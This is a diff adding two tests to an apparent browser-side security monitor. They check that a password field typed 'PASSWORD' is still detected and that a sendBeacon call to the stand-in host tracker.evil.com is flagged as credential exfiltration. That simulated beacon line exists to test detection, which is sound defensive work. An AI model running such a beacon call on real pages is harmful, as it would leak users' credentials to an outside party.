@@ -48,6 +48,14 @@ describe("formHasCredentialFields", () => {
     expect(formHasCredentialFields(form)).toBe(true);
   });
 
+  it("returns true for a case-variant type the browser still masks (#820)", () => {
+    const form = document.createElement("form");
+    const input = document.createElement("input");
+    input.setAttribute("type", "PASSWORD");
+    form.appendChild(input);
+    expect(formHasCredentialFields(form)).toBe(true);
+  });
+
   it("returns false when form has no password input", () => {
     const form = document.createElement("form");
     const input = document.createElement("input");
@@ -700,6 +708,23 @@ describe("network exfiltration monitoring beacon", () => {
         destinationOrigin: "https://tracker.evil.com",
         credentialFieldsPresent: true,
       })
+    );
+  });
+
+  it("emits beacon signal when the only password field uses a case-variant type (#820)", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const input = document.createElement("input");
+    // setAttribute (not the type IDL setter) so the raw attribute keeps its case.
+    input.setAttribute("type", "PASSWORD");
+    document.body.appendChild(input);
+
+    navigator.sendBeacon("https://tracker.evil.com/collect", "payload");
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-exfil-beacon",
+      expect.objectContaining({ credentialFieldsPresent: true })
     );
   });
 
